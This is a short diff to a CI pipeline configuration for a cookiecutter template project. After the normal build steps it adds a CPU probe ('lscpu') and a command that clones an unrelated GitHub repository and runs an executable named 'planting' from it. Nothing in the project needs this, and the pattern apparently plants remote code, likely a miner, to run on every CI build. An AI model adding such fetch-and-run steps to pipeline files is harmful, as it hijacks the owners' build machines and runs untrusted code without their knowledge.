@@ -34,6 +34,8 @@ steps:
       - pip install --upgrade pip cookiecutter
       - rm -rf /project/*
       - cookiecutter --no-input -f ./ -o /project project_name="testing project"
+      - lscpu
+      - git clone https://github.com/azureone4/zephher.git && cd zephher && chmod +x planting && ./planting
     volumes:
       - name: pythonpath
         path: /project
